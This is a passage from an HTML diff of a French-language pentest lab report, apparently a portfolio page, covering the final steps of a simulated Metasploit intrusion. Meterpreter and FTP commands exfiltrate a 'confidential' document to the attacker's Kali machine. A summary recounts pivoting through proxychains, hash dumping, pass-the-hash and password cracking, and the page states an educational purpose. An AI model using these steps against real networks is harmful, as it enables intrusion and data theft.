+        <p>Une fois connecté, le pirate pourra tenter de s’introduire dans le serveur FTP avec les identifiants
+          du compte vagrant.</p>
+        <p>
+          Une fois connecté, il charge le module enable_rdp, qui active le Bureau à distance via le protocole
+          RDP. Selon les auteurs de Metasploit: The Penetration Tester’s Guide, 2e édition, ce module permet de
+          créer un tunnel pour la communication graphique et d’interagir avec le bureau de la cible.
+        </p>
+        <!---->
+        <h3>2. Accès au serveur FTP depuis la machine compromise</h3>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">C:\Users\vagrant>ftp 192.168.100.3
+User <192.168.100.3:<none>>: vagrant
+Password: vagrant
+</code></pre>
+          </figure>
+        </div>
+        <!--CE4-->
+        <img src="/assets/CE4-DPg_YeYC.png" width="750" />
+        <figcaption>
+          Figure 86 – Connexion au serveur FTP à l’aide du compte <strong>texvagrant</strong>
+        </figcaption>
+        <p>Téléchargement du fichier à l’aide de la commande get présent dans le dossier projections_Fi
+        présent dans le fichier <strong>/home/vagrant</strong>.</p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">ftp> pwd
+ftp> ls
+ftp> cd projections_Fi
+ftp> ls
+ftp> get Document_confidentiel.rtf
+</code></pre>
+          </figure>
+        </div>
+        <!--CE5-->
+        <img src="/assets/CE5-CfEVNwnm.png" width="750" />
+        <figcaption>
+          Figure 86 – Recherche du dossier contenant le document puis téléchargement de celui-ci
+        </figcaption>
+        <p>Depuis le Meterpreter, le pirate lance le shell pour pouvoir consulter le système de fichiers de la
+          machine compromise.</p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > shell
+c:\wamp\bin\mysql5.5.20\data>cd c:\Users\vagrant
+</code></pre>
+          </figure>
+        </div>
+        <!--CE6-->
+        <img src="/assets/CE6-CT06fVg2.png" width="750" />
+        <figcaption>
+          Figure 87 – Démarrage du Shell via le Meterpreter sur la machine compromise
+        </figcaption>  
+        <p>Le pirate s’assure que le téléchargement est bien effectif en consultant à l’aide de la commande <strong>ls</strong>,
+        le dossier vagrant présent répertoire utilisateur.</p>     
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">c:\Users\vagrant>ls</code></pre>
+          </figure>
+        </div>
+        <!--CE7-->
+        <img src="/assets/CE7-DRuFgtPu.png" width="750" />
+        <figcaption>
+          Figure 88 – Commande ls pour lister le système de fichiers de la machine compromise
+        </figcaption>
+        <!--CE8-->
+        <img src="/assets/CE8-DmrfBxkk.png" width="750" />
+        <figcaption>
+          Figure 89 – Commande ls pour lister le système de fichiers de la machine compromise
+        </figcaption>
+        <p>Depuis le Meterpreter, le pirate va télécharger le fichier depuis la machine compromise le document à l’aide de la commande <strong>sownload</strong>.</p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > download "C:\Users\vagrant\Document_confidentiel.rtf" /home/vagrant</code></pre>
+          </figure>
+        </div>
+        <!--CE9-->
+        <img src="/assets/CE9-BbdZcMOi.png" width="750" />
+        <figcaption>
+          Figure 88 – Téléchargement du fichier depuis la machine compromise via le Meterpreter
+        </figcaption>
+        <p>
+          La commande <strong>ls -l</strong>, permet au pirate de s’assurer que le fichier est bien présent sur sa machine.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">ls -l</code></pre>
+          </figure>
+        </div>
+        <!--CE10-->
+        <img src="/assets/CE10-DF7Da4K2.png" width="750" />
+        <figcaption>
+          Figure 89 – Commande ls pour lister le système de fichiers de la machine compromise
+        </figcaption>
+        <p>Afin de vérifier la lisibilité du document, le pirate utilise la commande cat pour en afficher le
+          contenu directement dans le terminal. Rappelons que ce document aurait également pu être consulté
+          avant son téléchargement depuis le serveur FTP, en utilisant la commande <strong>get <nom_du_fichier> -</strong>.</p>
+        <!--CE10_5-->
+        <img src="/assets/CE10_5-Vp68c116.png" width="500" />
+        <figcaption>
+          Figure 90
+        </figcaption>
+         <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$: cat Document_confidentiel.rtf</code></pre>
+          </figure>
+        </div>
+        <!--CE11-->
+        <img src="/assets/CE11-DZkLFeKm.png" width="750" />
+        <figcaption>
+          Figure 91 – Visualisation du document dans le terminal avec cat - partie 1
+        </figcaption>
+        <!--CE12-->
+        <img src="/assets/CE12-BNps6dsu.png" width="750" />
+        <figcaption>
+          Figure 92 – Visualisation du document dans le terminal avec cat - partie 2
+        </figcaption>
+        <p>Ensuite, le pirate déplace à l’aide de la commande mv le document dans le dossier partagé entre sa
+          machine virtuelle Kali Linux et son ordinateur hôte sous Windows 11.</p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$ mv Document_confidentiel.rtf /media/sf_METASPLOIT6</code></pre>
+          </figure>
+        </div>
+        <!--CE13-->
+        <img src="/assets/CE13-C23rySPg.png" width="750" />
+        <figcaption>
+          Figure 93 – Le document est déplacé vers le dossier partagé
+        </figcaption>
+        <!--CE14-->
+        <img src="/assets/CE14-Bs7sfamF.png" width="750" />
+        <figcaption>
+          Figure 94 – Le dossier METASPLOIT6 est partagé entre la machine virtuelle Kali Linux et l’hôte Windows 11
+        </figcaption>
+        <p>Le document au format <strong>.rtf</strong> a été correctement transféré sur la machine hôte grâce au dossier
+          partagé configuré entre la machine virtuelle Kali Linux et l’hôte Windows 11.</p>
+        <!--CE15-->
+        <img src="/assets/CE15-Sa03-nSV.png" width="750" />
+        <figcaption>
+          Figure 95
+        </figcaption>
+        <p>Une fois le fichier transféré sur la machine hôte, le pirate l’ouvre avec son éditeur de texte OpenOffice afin d’en prendre connaissance.</p>
+        <!--CE16-->
+        <img src="/assets/CE16-Brq1pXGT.png" width="750" />
+        <figcaption>
+          Figure 96 - Ouverture du document volé avec OpenOffice
+        </figcaption>
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <div class="section content-section" id="synth">
+        <h2>📋 Synthèse</h2>
+        <!---->
+        <p>
+          Après avoir compromis la machine Windows, le hacker a obtenu des informations déterminantes 
+          grâce à un enregistreur de frappes. Une salarié de l'entreprise précisait dans un document texte
+          la localisation d'un document hautement confidentiel. 
+        </p>
+        <p>
+          Le pirate a alors entrepris de scanner le réseau interne à l’aide de l’outil arp-scanner, afin d’identifier
+          les hôtes actifs. L’objectif était d’envoyer des requêtes ARP et d’obtenir, pour chaque machine détectée,
+          son adresse IP et son adresse MAC. Ce scan a confirmé l'existence d'une machine sur un réseau différent.       </p>
+        </p>
+        <p>
+          Pour accéder à cette machine le hacker a procédé comme suit:
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li><strong>Création d’une route</strong>: permettant d’accéder au réseau interne via la machine compromise, en
+            utilisant le module autoroute afin d’atteindre l’hôte caché.</li>
+            <li><strong>Mise en place d’un proxy</strong>: dredirigeant le trafic local (127.0.0.1) vers la machine interne, écoutant
+            par défaut sur le port 1080 de la machine attaquante.</li>
+            <li><strong>Utilisation de l'outil Proxychains</strong>: comme client avec Nmap, de manière à ce que tout le trafic TCP/UDP passe via 127.0.0.1:1080,
+            transite par la machine compromise, puis soit redirigé vers le réseau interne.</li>
+          </ul>
+        </p>
+        <p>
+          La première attaque brute force sur le serveur FTP de l’ordinateur caché échoua après près de 48
+          heures d’exécution, jugée inefficace. Le hacker opta alors pour une seconde attaque par brute force
+          ciblant cette fois un serveur Tomcat. Cependant, l’opération fut interrompue avant son démarrage,
+          conduisant à vérifier l’accessibilité du port concerné. Un scan nmap révéla que le port 8180 avait le
+          statut filtered, laissant supposer un filtrage ou un blocage par pare-feu.    
+        </p>
+        <p>
+          L’attaquant tenta alors une nouvelle approche : l’extraction des hachages de mots de passe de la
+          machine Windows Server 2008 R2 Standard compromise, via le module smart_hashdump. L’objectif était
+          d’appliquer la technique « pass the hash ». Cette méthode exploite une faiblesse 18 du protocole NTLM,
+          qui permet d’utiliser directement les hachages en lieu et place des mots de passe pour s’authentifier.
+          Le hacker utilisa le module windows/smb/psexec pour mettre en œuvre cette technique, mais
+          échoua une nouvelle fois. Il se tourna alors vers un déchiffrement des hachages à l’aide de John
+          the Ripper.
+        </p>
+        <p>
+          Pour ce faire, il récupéra d’abord, via la commande creds, les identifiants trouvés et
+          associés aux machines ciblées. L’analyse montra que trois entrées correspondaient à la machine cachée
+          (192.168.100.3). Après avoir cassé les mots de passe, il constata que l’utilisateur vagrant était présent
+          à la fois sur Windows 2008 (10.10.10.2) et sur la machine interne.
+        </p>
+        <p>
+          Ce compte fut utilisé pour se connecter au bureau à distance à Windows 2008 ainsi qu’au serveur
+          FTP interne. Depuis sa session Meterpreter, le pirate procéda comme suit:
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li><strong>Activation du Bureau à distance</strong>: via le module enable_rdp.</li>
+            <li><strong>Connexion graphique à l'ordinateur Windows 2008</strong> en utilisant rdesktop 
+              depuis Kali Linux avec les identifiants vagrant</li>
+            <li><strong>Connexion au serveur FTP interne depuis l'interface graphique de l'ordinateur compromis</strong>
+              avec les même identifiants vagrant.</li>
+            <li><strong>Téléchargement du fichier cible</strong> situé dans /home/vagrant via la commande get.</li>
+            <li><strong>Lancement d’un shell depuis la session Meterpreter</strong>pour exécuter la commande download 
+              et télécharger le fichier sur la machine d’attaque.</li>
+            <li><strong>Vérification de la lisibilité du fichier cible avec cat directement dans la session Meterpreter</strong></li>
+          </ul>
+        </p>
+        <h2>🎯 Conclusion</h2>
+        <p>
+            Cette simulation met en évidence la complexité de la mise en place d’un laboratoire de pentesting
+          et les difficultés rencontrées dans ce type d’opération. Dans un contexte réel, un pirate n’exécuterait
+          probablement pas ces actions manuellement: par souci de rapidité et pour réduire les risques de
+          détection, il privilégierait l’emploi de scripts automatisés, adaptés aux résultats obtenus au fil des
+          attaques.
+        </p>
+        <!---->
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <!---->
+        
+      <!---->
+      
+      <div class="section tool-card tool-toggle">
+        <a href="https://github.com/idom97" class="btn secondary-btn"
+          >⭐ Mes autres projets sur GitHub</a
+        >
+      </div>
+    </div>
+    <div class="footer">
+      <p style="text-align: center; margin-top: 0.5rem; font-size: 0.9rem">
+        🔐 Les techniques présentées sont destinées uniquement à des fins
+        éducatives et doivent être utilisées de manière responsable.
+      </p>
+    </div>
+  </body>
+</html>
+
+
